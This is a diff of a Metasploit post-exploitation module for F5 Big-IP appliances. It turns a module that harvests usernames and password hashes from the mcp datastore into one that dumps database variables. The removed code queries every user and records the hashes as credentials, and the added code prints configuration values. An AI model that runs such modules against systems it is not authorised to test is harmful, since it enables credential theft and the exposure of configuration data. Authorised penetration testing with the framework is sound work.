@@ -10,10 +10,10 @@ class MetasploitModule < Msf::Post
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'         => 'F5 Big-IP Gather Users',
+      'Name'         => 'F5 Big-IP Gather DB Variables',
       'Description'  => %q{
-        This module gathers usernames and password hashes from F5's mcp
-        datastore, which is accessed via /var/run/mcp.
+        This module gathers database settings (called "db variables") from F5's
+        mcp datastore, which is accessed via /var/run/mcp.
       },
       'License'      => MSF_LICENSE,
       'Author'       =>
@@ -23,30 +23,28 @@ class MetasploitModule < Msf::Post
       'Platform'     => ['linux'],
       'SessionTypes' => ['shell', 'meterpreter']
     ))
+
+    register_options([
+      OptBool.new('SHOW_EMPTY', [true, 'Show empty db_variables?', false]),
+    ])
   end
 
   def run
-    users = mcp_query_all_users()
+    print_status("Fetching db variables (this will take a bit)...")
+    vars = mcp_query_all_db_variables()
 
-    unless users
-      print_error('Failed to query users')
+    unless vars
+      print_error('Failed to query db variables')
       return
     end
 
-    users.each do |u|
-      print_good("#{u['userdb_entry_name']} / #{u['userdb_entry_passwd']}")
+    vars.each do |v|
+      # Skip empty entries
+      if v['db_variable_value'] == '' && !datastore['SHOW_EMPTY']
+        next
+      end
 
-      # TODO: store loot?
-      create_credential(
-        jtr_format: Metasploit::Framework::Hashes.identify_hash(u['userdb_entry_passwd']),
-        origin_type: :session,
-        post_reference_name: self.refname,
-        private_type: :nonreplayable_hash,
-        private_data: u['userdb_entry_passwd'],
-        session_id: session_db_id,
-        username: u['userdb_entry_name'],
-        workspace_id: myworkspace_id
-      )
+      print_good "#{v['db_variable_name']} => #{v['db_variable_value']}"
     end
   end
 
